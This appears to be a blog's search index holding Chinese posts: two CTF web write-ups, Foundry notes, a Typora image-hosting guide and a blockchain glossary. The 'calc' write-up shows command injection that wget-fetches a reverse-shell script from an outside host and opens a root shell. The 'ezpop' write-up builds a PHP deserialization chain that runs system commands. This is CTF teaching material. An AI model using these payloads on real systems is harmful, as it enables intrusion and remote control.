<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2022DASCTF-calc</title>
    <url>/2022/04/19/DASCTF2022-calc/</url>
    <content><![CDATA[<h1 id="DASCTF-calc"><a href="#DASCTF-calc" class="headerlink" title="[DASCTF]-calc"></a>[DASCTF]-calc</h1><p>打开来是个计算器，没猜错应该要RCE</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)  </span><br></pre></td></tr></table></figure></div>

<p>过滤了一些命令常用的字符和函数，所以这里使用模板注入的机会不大，故专注于<code>os.system()</code>。另外，Linux命令常用的反引号没有被过滤，Python的注释符<code>#</code>也幸存了，由于<code>eval()</code>是执行一个Python的字符串表达式，为了不让它报错，需要用<code>#</code>把后面拼接的Linux命令注释掉。</p>
<h2 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h2><p>由于过滤了很多字符，且命令并无回显，所以这里用<code>wget</code>下载反弹shell的<code>sh</code>文件，然后运行</p>
<p>空格用%09绕过就好，也可以用<code>&gt;</code>等等，不多赘述</p>
<p>上传一个这样的shell文件到一个网站上</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/&#123;IP&#125;/&#123;PORT&#125; 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>

<p>让目标机器保存在<code>/tmp</code>下，然后执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">num=7*7%23`wget%09-P%09/tmp%09http://vveelin.com.cn:89/bsh.sh`</span><br><span class="line">num=7*7%23`sh%09/tmp/bsh.sh`</span><br></pre></td></tr></table></figure></div>

<p>攻击机监听对应端口，getshell</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[root@ecs-394098 ~]<span class="comment"># nc -lvnp 4444</span></span><br><span class="line">Ncat: Connection from 117.21.200.166.</span><br><span class="line">Ncat: Connection from 117.21.200.166:62378.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line"></span><br><span class="line">root@out:/<span class="comment"># cat Th1s_is__F1114g</span></span><br><span class="line"><span class="built_in">cat</span> Th1s_is__F1114g</span><br><span class="line">flag&#123;16c2218b-4113-411e-b64a-30dd12604d3c&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>2022DASCTF-ezpop</title>
    <url>/2022/04/19/DASCTF2022-ezpop/</url>
    <content><![CDATA[<h1 id="DASCTF-ezpop"><a href="#DASCTF-ezpop" class="headerlink" title="[DASCTF]-ezpop"></a>[DASCTF]-ezpop</h1><p>一道简单的php反序列化题目</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">v1</span>(<span class="variable">$this</span>-&gt;v2);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">	    <span class="variable language_">$this</span>-&gt;v1-&gt;<span class="title function_ invoke__">world</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;f1)();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1-&gt;<span class="title function_ invoke__">get_flag</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">	    <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">run</span>();  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;m1)();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="variable language_">$this</span>-&gt;m1);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123; <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>发现没有<code>__wakeup()</code>和<code>__construct()</code>，那么最先被调用的应该就是<code>fin</code>类里面的<code>__destruct()</code>方法了。</p>
<h2 id="构造POP链"><a href="#构造POP链" class="headerlink" title="构造POP链"></a>构造<code>POP</code>链</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fin::__destruct()    # 其中的echo触发__toString()</span><br><span class="line">↓</span><br><span class="line">what::__toString()   # 调用run()</span><br><span class="line">↓</span><br><span class="line">mix::run()           # 将f1以函数方式调用，触发__invoke()</span><br><span class="line">↓</span><br><span class="line">crow::__invoke()     # 调用不存在的方法world()，触发__call()</span><br><span class="line">↓</span><br><span class="line">fin::__call()        # 调用get_flag()</span><br><span class="line">↓</span><br><span class="line">mix::get_flag()      # 这里在命令前加了一个注释符，用换行符绕过即可</span><br></pre></td></tr></table></figure></div>

<h2 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造<code>Payload</code></h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$v1</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;v1 = <span class="variable">$v1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f1</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;f1 = <span class="variable">$f1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">   </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">   </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$m1</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;m1 = <span class="variable">$m1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mix</span>(<span class="string">&quot;\nsystem(&#x27;cat *&#x27;);&quot;</span>);</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title function_ invoke__">fin</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title function_ invoke__">crow</span>(<span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mix</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">what</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">fin</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div>

<p>输出</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A17%3A%22%0Asystem%28%27cat+%2A%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure></div>

<p>拿到flag</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//flag&#123;43282d76-6cb5-4e5c-9286-48e8688c6853&#125;</span><br><span class="line">not here, but it&#x27;s close, think more.not here, but it&#x27;s close, think more.not here, but it&#x27;s close, think more.not here, but you are almost getting the flag!</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Foundry 工具的使用笔记</title>
    <url>/2023/11/07/Foundry%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.</p>
<p>Foundry 是一个极快、可移植和模块化的工具包，用于用 Rust 编写的以太坊应用程序开发。</p>
<h2 id="Forge-的使用"><a href="#Forge-的使用" class="headerlink" title="Forge 的使用"></a>Forge 的使用</h2><p>Forge Standard Library (Forge Std for short) is a collection of helpful contracts that make writing tests easier, faster, and more user-friendly.</p>
<p>Forge Standard Library（简称 Forge Std）是有用的合同集合，使编写测试更容易、更快速、更用户友好。</p>
<h3 id="init-创建并初始化新项目"><a href="#init-创建并初始化新项目" class="headerlink" title="init 创建并初始化新项目"></a>init 创建并初始化新项目</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ forge init test_project</span><br></pre></td></tr></table></figure></div>

<p>由默认模板创建一个新目录 test_project，并初始化一个新的 git 仓库。</p>
<p>使用 –templates 参数可以从其他模板创建新项目。</p>
<p>默认模板目录结构如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ tree . -d -L 1</span><br><span class="line">.</span><br><span class="line">├── cache    // 编译用，缓存</span><br><span class="line">├── lib      // 自带Forge标准库</span><br><span class="line">├── out      // 测试后生成，包含合约工件，如ABI</span><br><span class="line">├── script   // 用于部署合约的脚本</span><br><span class="line">├── src      // 存放合约代码</span><br><span class="line">└── <span class="built_in">test</span>     // 测试合约代码</span><br><span class="line"></span><br><span class="line">6 directories</span><br></pre></td></tr></table></figure></div>

<h3 id="test-测试项目"><a href="#test-测试项目" class="headerlink" title="test 测试项目"></a>test 测试项目</h3><p>测试需要项目中有待测合约，和用于执行测试的测试合约。任何具有 test 开头的函数的合约都会被认为是测试合约，一般会放在项目的 test&#x2F; 目录下，并以 <code>.t.sol</code> 结尾。</p>
<p>待测合约：Counter.sol</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Counter &#123;</span><br><span class="line">    uint256 public number;</span><br><span class="line"></span><br><span class="line">    function setNumber(uint256 newNumber) public &#123;</span><br><span class="line">        number = newNumber;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increment() public &#123;</span><br><span class="line">        number++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>测试合约：Counter.t.sol</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &#123;Test, console2&#125; from &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &#123;Counter&#125; from &quot;../src/Counter.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract CounterTest is Test &#123;</span><br><span class="line">    Counter public counter;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        counter = new Counter();</span><br><span class="line">        counter.setNumber(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_Increment() public &#123;</span><br><span class="line">        counter.increment();</span><br><span class="line">        assertEq(counter.number(), 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testFuzz_SetNumber(uint256 x) public &#123;</span><br><span class="line">        counter.setNumber(x);</span><br><span class="line">        assertEq(counter.number(), x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>测试用法如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ forge <span class="built_in">test</span></span><br><span class="line">// 测试当前项目</span><br><span class="line"></span><br><span class="line">$ forge <span class="built_in">test</span> --match-contract &lt;待测合约&gt; --match-test &lt;测试合约&gt;</span><br><span class="line">// 测试筛选出的合约</span><br></pre></td></tr></table></figure></div>

<p>可以看到测试函数中除了调用被测合约的函数以外，还有用于验证测试结果的 assert() 函数，示例中是 assertEq()，用于判断两个参数是否相等：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function assertEq(int a, int b) internal &#123;</span><br><span class="line">    if (a != b) &#123;</span><br><span class="line">        emit log(&quot;Error: a == b not satisfied [int]&quot;);</span><br><span class="line">        emit log_named_int(&quot;      Left&quot;, a);</span><br><span class="line">        emit log_named_int(&quot;     Right&quot;, b);</span><br><span class="line">        fail();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>若是判断不符合预期，就会测试失败。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>Typora图片自动上传Github图床</title>
    <url>/2022/04/28/Typora%E5%9B%BE%E7%89%87%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0GitHub%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h2><p>平时比起一些花里胡哨的编辑器（如Obsidian），我还是更喜欢用Typora编辑markdown，分享一下Typora复制图片上传图床的技巧</p>
<h2 id="0x01-Github仓库作为图床"><a href="#0x01-Github仓库作为图床" class="headerlink" title="0x01 Github仓库作为图床"></a>0x01 Github仓库作为图床</h2><p>这里需要创建一个 <code>Repositories </code>(仓库)作为图床，登录GitHub进入个人页，在左边会有添加 <code>Repositories </code>的选项，点进去进入创建仓库的界面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/TyporaPics/img/202204280322781.png"
                      alt="image-20220428032248413"
                ></p>
<p>创建的界面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/TyporaPics/img/202204280323325.png"
                      alt="image-20220428032349070"
                ></p>
<ul>
<li><code>Repository name</code>处就填你想要的库名称，比如我的就叫 <code>TyporaPics</code></li>
<li><code>Description</code>那里随便写个描述就可以</li>
<li>权限那里要选择 <code>Public</code></li>
<li>记得勾选上<code>Add a README file</code>，是为了避免一大堆麻烦</li>
</ul>
<p>以上完成了就可以点击创建了</p>
<p>然后这边顺便拿一下 <code>token</code>吧，点击头向下拉栏的 <code>Settings</code>，再选择设置里的 <code>Developer settings</code>，进入 <code>Personal access tokens</code>，点击创建，底下的一大堆权限只需要勾上<code>repo</code>就可以了</p>
<p>注意：拿到 <code>token</code>后一定要妥善保存，这是它唯一一次能被看到！</p>
<h2 id="0x02-PicGo配置"><a href="#0x02-PicGo配置" class="headerlink" title="0x02 PicGo配置"></a>0x02 PicGo配置</h2><p>下载安装 <code>PicGo</code>，进入里面 <code>GitHub</code>图床的配置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/TyporaPics/img/202204280339616.png"
                      alt="image-20220428033916240"
                ></p>
<p>自定义域名那里的 <code>https://cdn.jsdelivr.net/gh/</code>是<code>cdn</code>的加速服务</p>
<p>图床这里设置完毕后，进入<code>PicGo</code>设置把“时间戳重命名”和“上传后自动复制URL”这两个选项开启， <code>PicGo</code>这边就OK了</p>
<h2 id="0x03-Typora配置"><a href="#0x03-Typora配置" class="headerlink" title="0x03 Typora配置"></a>0x03 Typora配置</h2><p>在“偏好设置”中找到“图像”，在“上传服务”处选择 <code>PicGo(app)</code>，并选好相应的路径，然后验证一下成不成功，如果想要一插入图片就自动上传的话可以在<code>“插入图片时...”</code>那里选择<code>上传图片</code>，我个人比较喜欢留一些缓冲的余地，在默认状况下，插入文件后会有按钮选项出现，点一下即可上传</p>
]]></content>
      <categories>
        <category>小妙招</category>
      </categories>
  </entry>
  <entry>
    <title>区块链安全基础备忘</title>
    <url>/2023/10/05/%E5%9F%BA%E7%A1%80%E5%A4%87%E5%BF%98/</url>
    <content><![CDATA[<h2 id="基础名词"><a href="#基础名词" class="headerlink" title="基础名词"></a>基础名词</h2><h3 id="钱包-Wallet"><a href="#钱包-Wallet" class="headerlink" title="钱包 Wallet"></a>钱包 Wallet</h3><p>是一个管理私钥的工具，允许通过其检查、存储、交易持有的数字货币。它是进入区块链世界的基础设施和重要入口。</p>
<ul>
<li><strong>冷钱包 Cold Wallet：</strong>离线钱包，通过生成数字货币的地址和私钥再保存实现存储。</li>
<li><strong>热钱包 Hot Wallet：</strong>在线钱包，使用较方便。</li>
</ul>
<h3 id="公链"><a href="#公链" class="headerlink" title="公链"></a>公链</h3><p>公有链（Public Blockchain）简称公链，是指任何人都可随时进入读取、任何人都能发送交易且能获得有效确认的共识区块链</p>
<h3 id="交易所-Exchange"><a href="#交易所-Exchange" class="headerlink" title="交易所 Exchange"></a>交易所 Exchange</h3><p>数字货币买卖交易的平台。</p>
<ul>
<li><p><strong>去中心化交易所：</strong></p>
<p>交易行为直接发生在区块链上，数字货币会直接发挥使用者的钱包，或是保存在区块链上的智能合约。目前市面上去中心化交易所有WhaleEx、Bancor、dYdX等。</p>
</li>
<li><p><strong>中心化交易所：</strong></p>
<p>目前热门交易所大多采用中心化技术，使用者在平台注册，并经过一连串的身份验证程序（KYC）后，就可以在平台交易数字货币。在使用其交易数字货币时，其货币交换不见得会发生在区块链上，可能仅是修改交易所数据库内的资产数字，交易所只需要在用户提款时准备充足的数字货币供汇出即可。当前的主流交易大部分是在中心化交易所内完成的，目前市面上的中心化交易所有币安、火币、OKEx等。</p>
</li>
</ul>
<h3 id="共识-Consensus"><a href="#共识-Consensus" class="headerlink" title="共识 Consensus"></a>共识 Consensus</h3><p>主要解决分布式系统中，多个节点之间对某个状态达成一致性的问题。</p>
<ul>
<li><p><strong>工作量证明 PoW（Proof of Work）：</strong></p>
<p>是历史上第一个成功的去中心化区块链共识算法，被比特币、以太坊、莱特币等主流公链广泛使用。</p>
<p>其要求节点参与者执行计算密集型的任务，但是对于其他网络参与者易于验证。在比特币的例子中，矿工竞相向由整个网络维护的区块链账本中添加所收集到的交易，即区块。为了做到这一点，矿工必须第一个准确计算出“nonce”，这是一个添加在字符串末尾的数字，用来创建一个满足开头特定个数为零的哈希值。不过存在采矿的大量电力消耗和低交易吞吐量等缺点。</p>
</li>
<li><p><strong>权益证明 PoS（Proof of Stake）：</strong></p>
<p>权力证明机制，一种主流的区块链共识算法，目的是为了让区块链里的分布式节点达成共识，它往往和工作量证明机制（PoW）一起出现。</p>
